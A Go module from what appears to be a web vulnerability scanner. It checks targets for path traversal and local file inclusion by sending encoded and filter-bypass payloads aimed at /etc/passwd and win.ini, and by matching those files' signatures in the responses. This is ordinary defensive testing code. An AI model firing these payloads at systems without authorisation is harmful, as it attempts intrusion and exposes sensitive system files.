package modules

import (
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"

	"github.com/MakFly/vx/pkg/engine"
)

// PathTraversal detects path traversal / local file inclusion vulnerabilities
// by injecting traversal payloads into common file-related parameters.
type PathTraversal struct{}

func (p *PathTraversal) Name() string        { return "traversal" }
func (p *PathTraversal) Description() string { return "Path traversal / LFI vulnerability detection" }

var traversalParams = []string{
	"file", "path", "page", "doc", "document", "folder",
	"root", "dir", "include", "template", "lang", "language",
}

var traversalPayloads = []struct {
	name    string
	payload string
	raw     bool // if true, payload is already encoded — do not re-encode
}{
	{"basic", "../../../etc/passwd", false},
	{"url-encoded", "..%2f..%2f..%2fetc/passwd", true},
	{"filter-bypass", "....//....//....//etc/passwd", false},
	{"double-encoded", "..%252f..%252f..%252fetc/passwd", true},
	{"windows", "../../../windows/win.ini", false},
	{"absolute", "/etc/passwd", false},
}

var traversalEndpoints = []struct {
	path  string
	param string
}{
	{"/download", "file"},
	{"/read", "path"},
	{"/static", "file"},
	{"/get", "doc"},
}

var (
	linuxPasswdRe = regexp.MustCompile(`root:.*:0:0:`)
	windowsIniRe  = regexp.MustCompile(`(?i)\[(extensions|fonts)\]`)
)

func (p *PathTraversal) Run(cfg *engine.Config) ([]engine.Finding, error) {
	client := newHTTPClient(cfg)
	base := strings.TrimRight(cfg.TargetURL, "/")

	var findings []engine.Finding
	seen := make(map[string]bool)

	// Phase 1: test common parameters on the target URL
	for _, param := range traversalParams {
		f := p.testParam(client, base, param, cfg)
		for _, finding := range f {
			key := finding.Title
			if !seen[key] {
				seen[key] = true
				findings = append(findings, finding)
			}
		}
	}

	// Phase 2: test common download/file endpoints
	for _, ep := range traversalEndpoints {
		epURL := base + ep.path
		f := p.testParam(client, epURL, ep.param, cfg)
		for _, finding := range f {
			key := finding.Title
			if !seen[key] {
				seen[key] = true
				findings = append(findings, finding)
			}
		}
	}

	return findings, nil
}

// testParam tests a single parameter on a URL with all traversal payloads.
func (p *PathTraversal) testParam(client *http.Client, baseURL, param string, cfg *engine.Config) []engine.Finding {
	var findings []engine.Finding

	// Get baseline response with a benign value
	benignURL := fmt.Sprintf("%s?%s=%s", baseURL, param, url.QueryEscape("index"))
	_, benignBody, err := doGet(client, benignURL, cfg.UserAgent)
	if err != nil {
		return findings
	}
	benignStr := string(benignBody)

	// Skip SPA catch-all pages
	if IsSPACatchAll(benignStr) {
		return findings
	}

	for _, pl := range traversalPayloads {
		var testURL string
		if pl.raw {
			testURL = fmt.Sprintf("%s?%s=%s", baseURL, param, pl.payload)
		} else {
			testURL = fmt.Sprintf("%s?%s=%s", baseURL, param, url.QueryEscape(pl.payload))
		}

		_, body, err := doGet(client, testURL, cfg.UserAgent)
		if err != nil {
			continue
		}
		bodyStr := string(body)

		// Skip SPA catch-all responses
		if IsSPACatchAll(bodyStr) {
			continue
		}

		// Check for file content leakage
		if p.hasFileContent(bodyStr) {
			osName := "Linux"
			if strings.Contains(pl.payload, "win.ini") {
				osName = "Windows"
			}
			findings = append(findings, engine.Finding{
				Module:      p.Name(),
				Severity:    engine.SevCritical,
				Title:       fmt.Sprintf("Path traversal: %s file content leaked via %s (%s)", osName, param, pl.name),
				Description: fmt.Sprintf("The %s parameter is vulnerable to path traversal. System file content was returned in the response.", param),
				Evidence:    fmt.Sprintf("URL: %s | Payload: %s | OS file signatures detected in response", testURL, pl.payload),
				CWE:         "CWE-22",
				Remediation: "Never use user input directly in file paths. Use an allowlist of permitted files, canonicalize paths, and ensure they stay within the intended directory.",
				CVSS:        9.1,
			})
			return findings // confirmed — no need to test more payloads for this param
		}

		// Differential analysis: response differs significantly from baseline
		if p.responsesDiffer(benignStr, bodyStr) && len(bodyStr) > 0 {
			findings = append(findings, engine.Finding{
				Module:      p.Name(),
				Severity:    engine.SevMedium,
				Title:       fmt.Sprintf("Possible path traversal via %s parameter (%s)", param, pl.name),
				Description: "The response for a traversal payload differs significantly from the baseline, suggesting the server may be processing the path. Manual verification required.",
				Evidence:    fmt.Sprintf("URL: %s | Baseline length: %d | Traversal length: %d", testURL, len(benignStr), len(bodyStr)),
				CWE:         "CWE-22",
				Remediation: "Validate and sanitize all file path parameters. Use allowlists and chroot-style path restrictions.",
				CVSS:        5.3,
			})
			break // one differential finding per param is enough
		}
	}

	return findings
}

// hasFileContent checks if the response body contains signatures of system files.
func (p *PathTraversal) hasFileContent(body string) bool {
	if strings.Contains(body, "root:x:0:0") || linuxPasswdRe.MatchString(body) {
		return true
	}
	if windowsIniRe.MatchString(body) {
		return true
	}
	return false
}

// responsesDiffer performs a heuristic to detect if two responses are
// significantly different, which may indicate path traversal behavior.
func (p *PathTraversal) responsesDiffer(baseline, traversal string) bool {
	if len(baseline) == 0 && len(traversal) == 0 {
		return false
	}

	bl := len(baseline)
	tl := len(traversal)
	if bl == 0 {
		return tl > 100
	}

	diff := bl - tl
	if diff < 0 {
		diff = -diff
	}
	ratio := float64(diff) / float64(bl)

	if ratio > 0.3 && tl > 50 {
		lower := strings.ToLower(traversal)
		if strings.Contains(lower, "not found") || strings.Contains(lower, "404") {
			return false
		}
		if strings.Contains(lower, "bad request") || strings.Contains(lower, "400") {
			return false
		}
		return true
	}

	return false
}
